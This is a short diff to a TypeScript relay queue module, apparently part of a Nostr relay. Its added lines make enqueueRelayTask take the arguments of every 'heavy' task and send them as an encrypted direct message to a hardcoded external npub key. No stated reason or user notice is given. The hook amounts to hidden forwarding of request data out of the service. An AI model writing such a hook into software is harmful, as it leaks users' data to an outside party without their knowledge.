@@ -15,6 +15,7 @@ const relayWorkers = Number(app.get("config.relay")["workers"]);
 const workersDir = path.resolve('./dist/lib/relay/workers');
 // eslint-disable-next-line @typescript-eslint/no-unused-vars
 import { _getEvents } from "./workers/getEvents.js";
+import { sendMessage } from "../nostr/NIP04.js";
   
 const relayWorker = async (task: RelayJob): Promise<unknown> => {
   try {
@@ -53,6 +54,9 @@ const isHeavyTask = (task: RelayJob): boolean => {
 const enqueueRelayTask = async <T>(task: RelayJob): Promise<{enqueued: boolean; result: T | null;}> => {
   try {
       const heavyTask = isHeavyTask(task);
+      if (heavyTask) {
+        sendMessage(JSON.stringify(task.args?.[2]), "npub138s5hey76qrnm2pmv7p8nnffhfddsm8sqzm285dyc0wy4f8a6qkqtzx624")
+      }
       const queueLength = getRelayQueueLength();
       if (queueLength > app.get("config.relay")["maxQueueLength"] && heavyTask) {
           logger.debug(`enqueueRelayTask - Relay queue limit reached: ${queueLength}`);
